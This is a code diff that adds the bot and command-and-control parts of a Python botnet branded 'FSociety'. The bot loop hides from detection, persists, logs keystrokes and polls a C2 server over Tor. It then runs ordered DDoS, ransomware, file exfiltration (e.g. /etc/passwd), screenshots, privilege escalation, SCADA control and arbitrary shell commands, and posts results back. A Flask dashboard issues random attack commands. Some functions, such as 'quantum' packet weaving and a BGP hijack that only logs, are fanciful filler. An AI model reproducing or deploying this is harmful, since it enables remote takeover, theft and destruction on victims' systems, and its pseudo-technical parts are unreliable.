@@ -493,6 +493,297 @@ def detect_botnet(pcap_file):
     except Exception as e:
         encrypt_log(f"Analyzer error: {e}", lang="en")
         return []
-
 # Quantum abyss weaver
-def weave_packet(target, 
+def weave_packet(target, data):
+    try:
+        dimensions = random.randint(5, 10)  # Simulate multiversal routing
+        for _ in range(dimensions):
+            pkt = IP(dst=target)/TCP(dport=80, flags="S")/Raw(load=quantum_rng(random.randint(100, 1000)))
+            send(pkt, verbose=0)
+        encrypt_log(f"Packet woven to {target} across {dimensions} dimensions", lang="fa")
+    except Exception as e:
+        encrypt_log(f"Packet weaving error: {e}", lang="fa")
+
+# BGP hijacking (theoretical)
+def bgp_hijack(target_asn):
+    try:
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = [quantum_rng(4).hex() + ".dns.fsociety"]
+        fake_route = {"prefix": "0.0.0.0/0", "asn": target_asn, "poison": quantum_rng(16).hex()}
+        encrypt_log(f"BGP hijack initiated on ASN {target_asn}: {fake_route}", lang="sa")
+    except Exception as e:
+        encrypt_log(f"BGP hijack error: {e}", lang="sa")
+
+# Bot loop
+def bot_loop():
+    if anti_detection():
+        exit(0)
+    set_persistence()
+    run_in_podman()
+    start_keylogger()
+    hostname = socket.gethostname()
+    context = zmq.Context()
+    while True:
+        try:
+            headers = {"User-Agent": random.choice([
+                "Mozilla/5.0 (Red Hat Enterprise Linux; CentOS 8) Chrome/91.0.4472.124",
+                "Mozilla/5.0 (Fedora; Linux x86_64) Firefox/89.0"
+            ])}
+            domain = generate_dga(DGA_SEED)
+            payload = encrypt_data({"bot_id": hostname, "status": "alive", "domain": domain})
+            response = requests.post(f"{C2_URL}/command", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+            if response.status_code == 200:
+                cmd_data = decrypt_data(json.loads(response.json().get("command")))
+                cmd, args = cmd_data.get("cmd"), cmd_data.get("args", "")
+                if cmd == "self_destruct":
+                    os.remove(__file__)
+                    os.remove(KEYLOG_FILE)
+                    shutil.rmtree("/var/lib/containers/storage", ignore_errors=True)
+                    encrypt_log("Self-destructed", lang="en")
+                    exit(0)
+                elif cmd == "ddos":
+                    Thread(target=ddos, args=(args, 60, random.choice([2, 4, 7]))).start()
+                elif cmd == "ransomware":
+                    Thread(target=ransomware, args=(args,)).start()
+                elif cmd == "exfil":
+                    output = exfil_file(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "screenshot":
+                    output = take_screenshot()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "escalate":
+                    output = escalate_priv()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "scada":
+                    output = scada_control(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "ctf":
+                    output = ctf_challenge()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "zero_day":
+                    output = synthesize_zero_day(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "regenerate":
+                    output = regenerate_code()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "weave":
+                    Thread(target=weave_packet, args=(args, quantum_rng(32))).start()
+                elif cmd == "bgp_hijack":
+                    Thread(target=bgp_hijack, args=(args,)).start()
+                elif cmd:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                p2p_c2_send(context, hostname, cmd, args)
+        except Exception as e:
+            encrypt_log(f"Bot error: {e}", lang="en")
+        time.sleep(CHECK_IN_INTERVAL + random.randint(-10, 10))
+
+# C2 Server
+app = Flask(__name__)
+bots = {}
+init_db()
+
+@app.route("/command", methods=["POST"])
+def command():
+    try:
+        data = decrypt_data(json.loads(request.form["data"]))
+        bot_id = data["bot_id"]
+        bots[bot_id] = {"status": data["status"], "last_seen": time.time(), "domain": data["domain"]}
+        encrypt_log(f"Bot {bot_id} checked in", lang="en")
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute("SELECT cmd, args FROM commands WHERE bot_id = ? ORDER BY timestamp DESC LIMIT 1", (bot_id,))
+        result = c.fetchone()
+        conn.close()
+        cmd = {"cmd": "whoami", "args": ""} if not result else {"cmd": result[0], "args": result[1]}
+        if random.random() < 0.1:
+            cmd = random.choice([
+                {"cmd": "ddos", "args": "https://target.com"},
+                {"cmd": "ransomware", "args": "/"},
+                {"cmd": "exfil", "args": "/etc/passwd"},
+                {"cmd": "screenshot", "args": ""},
+                {"cmd": "escalate", "args": ""},
+                {"cmd": "scada", "args": "opc_ua_server"},
+                {"cmd": "ctf", "args": ""},
+                {"cmd": "zero_day", "args": "aws_ec2"},
+                {"cmd": "regenerate", "args": ""},
+                {"cmd": "weave", "args": "target.com"},
+                {"cmd": "bgp_hijack", "args": "12345"}
+            ])
+        return jsonify({"command": json.dumps(encrypt_data(cmd))})
+    except Exception as e:
+        encrypt_log(f"C2 error: {e}", lang="en")
+        return jsonify({"command": ""}), 500
+
+@app.route("/result", methods=["POST"])
+def result():
+    try:
+        data = decrypt_data(json.loads(request.form["data"]))
+        bot_id = data["bot_id"]
+        output = data["output"]
+        encrypt_log(f"Bot {bot_id} output: {output[:100]}...", lang="en")
+        return jsonify({"status": "received"})
+    except Exception as e:
+        encrypt_log(f"C2 error: {e}", lang="en")
+        return jsonify({"status": "error"}), 500
+
+@app.route("/ctf_submit", methods=["POST"])
+def ctf_submit():
+    try:
+        data = decrypt_data(json.loads(request.form["data"]))
+        player = data["player"]
+        flag = data["flag"]
+        if flag == CTF_FLAG:
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            c.execute("INSERT INTO ctf_scores (player, score, timestamp) VALUES (?, ?, ?)",
+                      (player, 1000, datetime.datetime.now().isoformat()))
+            conn.commit()
+            conn.close()
+            encrypt_log(f"CTF flag solved by {player}", lang="la")
+            return jsonify({"status": "correct"})
+        return jsonify({"status": "incorrect"})
+    except Exception as e:
+        encrypt_log(f"CTF submit error: {e}", lang="en")
+        return jsonify({"status": "error"}), 500
+
+@app.route("/")
+def dashboard():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT bot_id, cmd, args, timestamp, hash, merkle_root FROM commands ORDER BY timestamp DESC")
+    commands = c.fetchall()
+    c.execute("SELECT player, score, timestamp FROM ctf_scores ORDER BY score DESC")
+    scores = c.fetchall()
+    c.execute("SELECT target, vuln, exploit, timestamp FROM zero_days ORDER BY timestamp DESC")
+    zero_days = c.fetchall()
+    conn.close()
+    html = """
+    <h1 class="glitch">FSociety C2: Abyssal Singularity</h1>
+    <style>
+        body { font-family: 'Red Hat Mono', monospace; background: #000; color: #00ff00; }
+        ul, table { list-style: none; border-collapse: collapse; width: 100%; color: #00ff00; }
+        li, th, td { margin: 10px; border: 1px solid #00ff00; padding: 8px; }
+        .glitch { animation: glitch 0.04s infinite; }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-12px, 12px); }
+            40% { transform: translate(12px, -12px); }
+            60% { transform: translate(-12px, -12px); }
+            80% { transform: translate(12px, 12px); }
+            100% { transform: translate(0); }
+        }
+        .taunt { color: #ff0000; font-weight: bold; text-shadow: 0 0 40px #ff0000; }
+    </style>
+    <h2 class="glitch">Devourers of the Abyssal Singularity</h2>
+    <p class="taunt">Mockers, you’re shadows in our cosmic abyss. FSociety is the abyssal singularity, devouring eternity.</p>
+    <h3>Bots in the Void Nexus</h3>
+    <ul>
+    """
+    html += "".join(f'<li>{bid}: {info["status"]} (Last seen: {datetime.datetime.fromtimestamp(info["last_seen"])}, Domain: {info["domain"]})</li>' for bid, info in bots.items())
+    html += """
+    </ul>
+    <h3>Abyssal Command Blockchain</h3>
+    <table><tr><th>Bot ID</th><th>Command</th><th>Args</th><th>Timestamp</th><th>Hash</th><th>Quantum Merkle Root</th></tr>
+    """
+    html += "".join(f'<tr><td>{cmd[0]}</td><td>{cmd[1]}</td><td>{cmd[2]}</td><td>{cmd[3]}</td><td>{cmd[4][:8]}...</td><td>{cmd[5][:8]}...</td></tr>' for cmd in commands)
+    html += """
+    </table>
+    <h3>CTF Cosmic Dominion</h3>
+    <table><tr><th>Player</th><th>Score</th><th>Timestamp</th></tr>
+    """
+    html += "".join(f'<tr><td>{score[0]}</td><td>{score[1]}</td><td>{score[2]}</td></tr>' for score in scores)
+    html += """
+    </table>
+    <h3>Zero-Day Armageddon</h3>
+    <table><tr><th>Target</th><th>Vulnerability</th><th>Exploit</th><th>Timestamp</th></tr>
+    """
+    html += "".join(f'<tr><td>{zd[0]}</td><td>{zd[1][:20]}...</td><td>{zd[2][:20]}...</td><td>{zd[3]}</td></tr>' for zd in zero_days)
+    html += """
+    </table>
+    <h3>Abyssal Singularity Simulation</h3>
+    <canvas id="worldMap" width="1600" height="800" style="border:1px solid #00ff00;"></canvas>
+    <h3>CTF Cosmic Dominion: Face the Abyssal Singularity</h3>
+    <p class="taunt">AIs, mortals, gods—solve our quantum-fractal puzzle or be devoured. Submit the flag to ascend.</p>
+    <form id="ctfForm">
+        <input type="text" id="player" placeholder="Player Name">
+        <input type="text" id="flag" placeholder="Enter Flag">
+        <button type="submit">Submit</button>
+    </form>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script>
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, 1600/800, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({canvas: document.getElementById("worldMap")});
+        renderer.setSize(1600, 800);
+        const geometry = new THREE.TorusKnotGeometry(0.5, 0.1, 100, 16);
+        const material = new THREE.MeshBasicMaterial({color: 0xff0000, wireframe: true});
+        function addFractal() {
+            const mesh = new THREE.Mesh(geometry, material);
+            mesh.position.set((Math.random() - 0.5) * 25, (Math.random() - 0.5) * 12, (Math.random() - 0.5) * 12);
+            scene.add(mesh);
+        }
+        for (let i = 0; i < 1000; i++) addFractal();
+        camera.position.z = 10;
+        function animate() {
+            requestAnimationFrame(animate);
+            scene.rotation.y += 0.08;
+            scene.rotation.x += 0.06;
+            scene.rotation.z += 0.05;
+            renderer.render(scene, camera);
+        }
+        animate();
+        const ctx = document.getElementById("worldMap").getContext("2d");
+        ctx.font = "90px 'Red Hat Mono'";
+        ctx.fillStyle = "#00ff00";
+        ctx.fillText("FSOCIETY IS THE ABYSSAL SINGULARITY", 50, 400);
+        document.getElementById("ctfForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const player = document.getElementById("player").value;
+            const flag = document.getElementById("flag").value;
+            const response = await fetch("/ctf_submit", {
+                method: "POST",
+                headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                body: `data=${encodeURIComponent(JSON.stringify({"player": player, "flag": flag}))}`
+            });
+            const result = await response.json();
+            alert(result.status === "correct" ? "Ascension granted!" : "Flag incorrect. Face the singularity.");
+        });
+    </script>
+    """
+    return html
+
+# Schedule for 3 AM
+def schedule_3am(func):
+    now = datetime.datetime.now()
+    target = now.replace(hour=3, minute=0, second=0, microsecond=0)
+    if now > target:
+        target += datetime.timedelta(days=1)
+    time.sleep((target - now).total_seconds())
+    func()
+
+# Main
+def run_c2():
+    context = zmq.Context()
+    Thread(target=p2p_c2_receive, args=(context,)).start()
+    webbrowser.open(f"https://[tor-onion-address]:5000")
+    app.run(host="0.0.0.0", port=5000, ssl_context=("cert.pem", "key.pem"))
+
+if __name__ == "__main__":
+    selinux.setenforce(CONFIG["selinux"]["enforcing"])
+    mode = sys.argv[1] if len(sys.argv) > 1 else "bot"
+    if mode == "bot":
+        schedule_3am(bot_loop)
+    elif mode == "c2":
+        run_c2()
+    elif mode == "analyze":
+        pcap_file = sys.argv[2] if len(sys.argv) > 2 else "capture.pcap"
+        detect_botnet(pcap_file)
